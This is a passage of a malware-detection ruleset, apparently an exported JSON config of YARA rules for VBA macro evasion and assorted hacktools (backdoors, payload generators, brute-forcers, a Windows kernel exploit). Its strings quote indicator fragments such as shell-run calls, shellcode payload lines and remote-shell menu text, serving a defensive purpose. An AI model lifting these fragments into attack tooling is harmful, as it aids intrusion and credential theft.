/\\bApplication\\.Wait\\s+(\\(\\s*)?Now(\\(\\))?\\s*\\+\\s*TimeValue\\(\\s*\\\"(([1-9]|0[1-9]|[1-9][0-9]):\\d{2}:\\d{1,2}|\\d{2}:(0[1-9]|[1-9][0-9]):\\d{1,2}|\\d{1,2}:\\d{2}:[1-9][0-9])\\\"\\)\\)?/ nocase\n\n    condition:\n        _VBA_macro\n        and (\n            any of them\n        )\n}\n\nrule VBA_Time_Delay_with_Obfuscation\n{\n    meta:\n        description = \"VBA macro utilizes obfuscated time delay functions; possible analysis counter-measure\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $time_serial = /\\bTimeSerial\\(\\s*[a-z]+,\\s*[a-z]+,\\s*\\d+\\s*\\)/ nocase\n        $time_value = /\\bTimeValue\\(\\s*[a-z]+\\(.+\\)\\)/ nocase\n\n    condition:\n        _VBA_macro\n        and (\n            any of them\n        )\n}\n\nrule WScriptShell_Case_Anomaly\n{\n    meta:\n        description = \"Obfuscated wscript.shell commands\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WScriptShell_Case_Anomaly\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"WScript.Shell\\\").Run\" nocase ascii wide\n        $sn1 = \"WScript.Shell\\\").Run\" ascii wide\n        $sn2 = \"wscript.shell\\\").run\" ascii wide\n        $sn3 = \"WSCRIPT.SHELL\\\").RUN\" ascii wide\n        $sn4 = \"Wscript.Shell\\\").Run\" ascii wide\n        $sn5 = \"WScript.Shell\\\").Run\" ascii wide\n        $sn6 = \"WScript.shell\\\").Run\" ascii wide\n\n    condition:\n        _VBA_macro and $s1 and not 1 of ($sn*)\n}",
      "send_mail": false,
      "shareable": true
    },
    "5": {
      "builtin": true,
      "builtin_name": "Hacktools",
      "created": "2020-05-10 14:25:02.654965",
      "id": 5,
      "modified": "2020-08-27 12:53:30.348116",
      "name": "Hacktools",
      "owner_user_id": null,
      "rules": "import \"pe\"\n\nrule ABPTTS\n{\n    meta:\n        description = \"ABPTTS: TCP tunneling over HTTP\"\n        ref = \"https://github.com/nccgroup/ABPTTS\"\n        classifications = \"Hacktool\"\n        threat_names = \"ABPTTS\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"hacktool_multi_ncc_ABPTTS\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"---===[[[ A Black Path Toward The Sun ]]]===---\" ascii wide\n        $s2 = \"https://vulnerableserver/EStatus/\" ascii wide\n        $s3 = \"Error: no ABPTTS forwarding URL was specified. This utility will now exit.\" ascii wide\n        $s4 = \"tQgGur6TFdW9YMbiyuaj9g6yBJb2tCbcgrEq\" fullword ascii wide\n        $s5 = \"63688c4f211155c76f2948ba21ebaf83\" fullword ascii wide\n        $s6 = \"ABPTTSClient-log.txt\" fullword ascii wide\n\n    condition:\n        any of them\n}\n\nrule Beastdoor_Backdoor\n{\n    meta:\n        description = \"Beastdoor: backdoor\"\n        classifications = \"Hacktool\"\n        threat_names = \"Beastdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Beastdoor_Backdoor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Redirect SPort RemoteHost RPort  -->Port Redirector\" fullword\n        $s1 = \"POST /scripts/WWPMsg.dll HTTP/1.0\" fullword\n        $s2 = \"http://IP/a.exe a.exe            -->Download A File\" fullword\n        $s7 = \"Host: wwp.mirabilis.com:80\" fullword\n        $s8 = \"%s -Set Port PortNumber              -->Set The Service Port\" fullword\n        $s11 = \"Shell                            -->Get A Shell\" fullword\n        $s14 = \"DeleteService ServiceName        -->Delete A Service\" fullword\n        $s15 = \"Getting The UserName(%c%s%c)-->ID(0x%s) Successfully\" fullword\n        $s17 = \"%s -Set ServiceName ServiceName      -->Set The Service Name\" fullword\n\n    condition:\n        2 of them\n}\n\nrule BeyondExec_RemoteAccess_Tool\n{\n    meta:\n        description = \"BeyondExec: remote access tool (file rexesvr.exe)\"\n        ref = \"https://goo.gl/BvYurS\"\n        classifications = \"Hacktool\"\n        threat_names = \"BeyondExec\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"BeyondExec_RemoteAccess_Tool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\BeyondExecV2\\\\Server\\\\Release\\\\Pipes.pdb\" ascii\n        $x2 = \"\\\\\\\\.\\\\pipe\\\\beyondexec%d-stdin\" fullword ascii\n        $x3 = \"Failed to create dispatch pipe. Do you have another instance running?\" fullword ascii\n        $op1 = { 83 e9 04 72 0c 83 e0 03 03 c8 ff 24 85 80 6f 40 }\n        $op2 = { 6a 40 33 c0 59 bf e0 d8 40 00 f3 ab 8d 0c 52 c1 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (1 of ($x*) or all of ($op*))) or (3 of them)\n}\n\nrule CactusTorch\n{\n    meta:\n        description = \"CactusTorch: payload generator\"\n        ref = \"https://github.com/mdsecactivebreach/CACTUSTORCH\"\n        classifications = \"Hacktool\"\n        threat_names = \"CactusTorch\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CACTUSTORCH\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"$payload = shellcode(%options[\\\"listener\\\"], \\\"true\\\", \\\"x86\\\");\" fullword ascii\n        $x2 = \"Copy the base64 encoded payload into the code variable below.\" fullword ascii\n        $x3 = \" CACTUSTORCH Payload\" ascii\n        $x4 = \"ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)\" fullword ascii\n        $x5 = \"' Author: Vincent Yiu (@vysecurity)\" fullword ascii\n        $x6 = \"Dim binary : binary = \\\"rundll32.exe\\\"\" fullword ascii\n        $a1 = \"code = code & \\\"\" ascii\n        $a2 = \"serialized_obj = serialized_obj & \\\"\" ascii\n        $s1 = \"binary = \\\"rundll32.exe\\\"\" fullword ascii\n        $s2 = \"EL.DataType = \\\"bin.hex\\\"\" fullword ascii\n        $s3 = \"Set stm = CreateObject(\\\"System.IO.MemoryStream\\\")\" fullword ascii\n        $s4 = \"var binary = \\\"rundll32.exe\\\";\" fullword ascii\n        $s5 = \"var serialized_obj = \\\"\" ascii\n\n    condition:\n        (filesize < 800KB and (1 of ($x*) or (1 of ($a*) and 1 of ($s*)))) or (3 of them)\n}\n\nrule ChineseHacktools_xbat\n{\n    meta:\n        description = \"Chinese hacktool (file: xbat.vbs)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_xbat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"ws.run \\\"srss.bat /start\\\",0 \" fullword ascii\n        $s1 = \"Set ws = Wscript.CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n\n    condition:\n        uint16(0) == 0x6553 and filesize < 0KB and all of them\n}\n\nrule ChineseHacktools_Temp\n{\n    meta:\n        description = \"Chinese hacktool (file: Temp.war)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_Temp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"META-INF/context.xml<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\" fullword ascii\n        $s1 = \"browser.jsp\" fullword ascii\n        $s3 = \"cmd.jsp\" fullword ascii\n        $s4 = \"index.jsp\" fullword ascii\n\n    condition:\n        uint16(0) == 0x4b50 and filesize < 203KB and all of them\n}\n\nrule ChineseHacktools_srss\n{\n    meta:\n        description = \"Chinese hacktool (file: srss.bat)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_srss\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"srss.exe -idx 0 -ip\"\n        $s1 = \"-port 21 -logfilter \\\"_USER ,_P\" ascii\n\n    condition:\n        filesize < 100 and all of them\n}\n\nrule ChineseHacktools_dll_UnReg\n{\n    meta:\n        description = \"Chinese hacktool (file: UnReg.bat)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"dll_UnReg\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"regsvr32.exe /u C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n        $s1 = \"del /F /Q C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n\n    condition:\n        filesize < 1KB and 1 of them\n}\n\nrule ChineseHacktools_dll_Reg\n{\n    meta:\n        description = \"Chinese hacktool (file: Reg.bat)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"dll_Reg\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"copy PacketX.dll C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n        $s1 = \"regsvr32.exe C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule ChineseHacktools_sbin_squid\n{\n    meta:\n        description = \"Chinese hacktool (file: squid.bat)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"sbin_squid\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"del /s /f /q\" fullword ascii\n        $s1 = \"squid.exe -z\" fullword ascii\n        $s2 = \"net start Squid\" fullword ascii\n        $s3 = \"net stop Squid\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule ChineseHacktools_sql1433_creck\n{\n    meta:\n        description = \"Chinese hacktool (file: creck.bat)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"sql1433_creck\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"start anhao3.exe -i S.txt -p  pass3.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n        $s1 = \"start anhao1.exe -i S.txt -p  pass1.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n        $s2 = \"start anhao2.exe -i S.txt -p  pass2.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n\n    condition:\n        uint16(0) == 0x7473 and filesize < 1KB and 1 of them\n}\n\nrule ChineseHacktools_sql1433_Start\n{\n    meta:\n        description = \"Chinese hacktool (file: Start.bat)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"sql1433_Start\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n        $s2 = \"start creck.bat\" fullword ascii\n        $s3 = \"del s1.txt\" fullword ascii\n        $s4 = \"del Result.txt\" fullword ascii\n        $s5 = \"del s.TXT\" fullword ascii\n        $s6 = \"mode con cols=48 lines=20\" fullword ascii\n\n    condition:\n        filesize < 1KB and 2 of them\n}\n\nrule ChineseHacktools_mswin_check_lm_group\n{\n    meta:\n        description = \"Chinese hacktool (file: mswin_check_lm_group.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"mswin_check_lm_group\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Valid_Global_Groups: checking group membership of '%s\\\\%s'.\" fullword ascii\n        $s2 = \"Usage: %s [-D domain][-G][-P][-c][-d][-h]\" fullword ascii\n        $s3 = \"-D    default user Domain\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 380KB and all of them\n}\n\nrule ChineseHacktools_WAF_Bypass\n{\n    meta:\n        description = \"Chinese hacktool (file: WAF-Bypass.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WAF_Bypass\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Email: blacksplitn@gmail.com\" fullword wide\n        $s2 = \"User-Agent:\" fullword wide\n        $s3 = \"Send Failed.in RemoteThread\" fullword ascii\n        $s4 = \"www.example.com\" fullword wide\n        $s5 = \"Get Domain:%s IP Failed.\" fullword ascii\n        $s6 = \"Connect To Server Failed.\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 7992KB and 5 of them\n}\n\nrule ChineseHacktools_Guilin_veterans_cookie_spoofing_tool\n{\n    meta:\n        description = \"Chinese hacktool (file: Guilin veterans cookie spoofing tool.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Guilin_veterans_cookie_spoofing_tool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"kernel32.dll^G\" fullword ascii\n        $s1 = \"\\\\.Sus\\\"B\" fullword ascii\n        $s4 = \"u56Load3\" fullword ascii\n        $s11 = \"O MYTMP(iM) VALUES (\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1387KB and all of them\n}\n\nrule ChineseHacktools_MarathonTool\n{\n    meta:\n        description = \"Chinese hacktool (file: MarathonTool.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MarathonTool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"MarathonTool\" ascii\n        $s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n        $s18 = \"SELECT UNICODE(SUBSTRING((system_user),{0},1))\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1040KB and all of them\n}\n\nrule ChineseHacktools_PLUGIN_TracKid\n{\n    meta:\n        description = \"Chinese hacktool (file: TracKid.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PLUGIN_TracKid\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"E-mail: cracker_prince@163.com\" fullword ascii\n        $s1 = \".\\\\TracKid Log\\\\%s.txt\" fullword ascii\n        $s2 = \"Coded by prince\" fullword ascii\n        $s3 = \"TracKid.dll\" fullword ascii\n        $s4 = \".\\\\TracKid Log\" fullword ascii\n        $s5 = \"%08x -- %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 3 of them\n}\n\nrule ChineseHacktools_Pc_pc2015\n{\n    meta:\n        description = \"Chinese hacktool (file: pc2015.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Pc_pc2015\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\svchost.exe\" fullword ascii\n        $s1 = \"LON\\\\OD\\\\O-\\\\O)\\\\O%\\\\O!\\\\O=\\\\O9\\\\O5\\\\O1\\\\O\" fullword ascii\n        $s8 = \"%s%08x.001\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 309KB and all of them\n}\n\nrule ChineseHacktools_sekurlsa\n{\n    meta:\n        description = \"Chinese hacktool (file: sekurlsa.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"sekurlsa\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Bienvenue dans un processus distant\" fullword wide\n        $s2 = \"Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur\" wide\n        $s3 = \"SECURITY\\\\Policy\\\\Secrets\" fullword wide\n        $s4 = \"Injection de donn\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1150KB and all of them\n}\n\nrule ChineseHacktools_mysqlfast\n{\n    meta:\n        description = \"Chinese hacktool (file: mysqlfast.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"mysqlfast\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Invalid password hash: %s\" fullword ascii\n        $s3 = \"-= MySql Hash Cracker =- \" fullword ascii\n        $s4 = \"Usage: %s hash\" fullword ascii\n        $s5 = \"Hash: %08lx%08lx\" fullword ascii\n        $s6 = \"Found pass: \" fullword ascii\n        $s7 = \"Pass not found\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and 4 of them\n}\n\nrule ChineseHacktools_DTools2_02_DTools\n{\n    meta:\n        description = \"Chinese hacktool (file: DTools.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"DTools2_02_DTools\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"kernel32.dll\" ascii\n        $s1 = \"TSETPASSWORDFORM\" fullword wide\n        $s2 = \"TGETNTUSERNAMEFORM\" fullword wide\n        $s3 = \"TPORTFORM\" fullword wide\n        $s4 = \"ShellFold\" fullword ascii\n        $s5 = \"DefaultPHotLigh\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule ChineseHacktools_dll_PacketX\n{\n    meta:\n        description = \"Chinese hacktool (file: PacketX.dll - ActiveX wrapper for WinPcap packet capture library)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"dll_PacketX\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s9 = \"[Failed to load winpcap packet.dll.\" wide\n        $s10 = \"PacketX Version\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1920KB and all of them\n}\n\nrule ChineseHacktools_SqlDbx_zhs\n{\n    meta:\n        description = \"Chinese hacktool (file: SqlDbx_zhs.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SqlDbx_zhs\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"S.failed_logins \\\"Failed Login Attempts\\\", \" fullword ascii\n        $s7 = \"SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE\" fullword ascii\n        $s8 = \"SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'\" ascii\n        $s9 = \"bcp.exe <:schema:>.<:table:> out \\\"<:file:>\\\" -n -S <:server:> -U <:user:> -P <:\" ascii\n        $s11 = \"L.login_policy_name AS \\\"Login Policy\\\", \" fullword ascii\n        $s12 = \"mailto:support@sqldbx.com\" fullword ascii\n        $s15 = \"S.last_login_time \\\"Last Login\\\", \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and 4 of them\n}\n\nrule ChineseHacktools_ms10048_x86\n{\n    meta:\n        description = \"Chinese hacktool (file: ms10048-x86.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ms10048_x86\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[ ] Resolving PsLookupProcessByProcessId\" fullword ascii\n        $s2 = \"The target is most likely patched.\" fullword ascii\n        $s3 = \"Dojibiron by Ronald Huizer, (c) master@h4cker.us .\" fullword ascii\n        $s4 = \"[ ] Creating evil window\" fullword ascii\n        $s5 = \"%sHANDLEF_INDESTROY\" fullword ascii\n        $s6 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 4 of them\n}\n\nrule ChineseHacktools_Dos_ch\n{\n    meta:\n        description = \"Chinese hacktool (file: ch.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_ch\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"/Churraskito/-->Usage: Churraskito.exe \\\"command\\\" \" fullword ascii\n        $s4 = \"fuck,can't find WMI process PID.\" fullword ascii\n        $s5 = \"/Churraskito/-->Found token %s \" fullword ascii\n        $s8 = \"wmiprvse.exe\" fullword ascii\n        $s10 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n        $s17 = \"WinSta0\\\\Default\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 260KB and 3 of them\n}\n\nrule ChineseHacktools_DUBrute_DUBrute\n{\n    meta:\n        description = \"Chinese hacktool (file: DUBrute.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"DUBrute_DUBrute\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n        $s2 = \"IP - 0; Login - 0; Password - 0; Combination - 0\" fullword ascii\n        $s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n        $s4 = \"UBrute.com\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1020KB and all of them\n}\n\nrule ChineseHacktools_CookieTools\n{\n    meta:\n        description = \"Chinese hacktool (file: CookieTools.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CookieTools\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=\" fullword ascii\n        $s2 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n        $s3 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n        $s8 = \"OnGetPasswordP\" fullword ascii\n        $s12 = \"http://www.chinesehack.org/\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and 4 of them\n}\n\nrule ChineseHacktools_update_PcInit\n{\n    meta:\n        description = \"Chinese hacktool (file: PcInit.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"update_PcInit\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\svchost.exe\" fullword ascii\n        $s2 = \"%s%08x.001\" fullword ascii\n        $s3 = \"Global\\\\ps%08x\" fullword ascii\n        $s4 = \"drivers\\\\\" 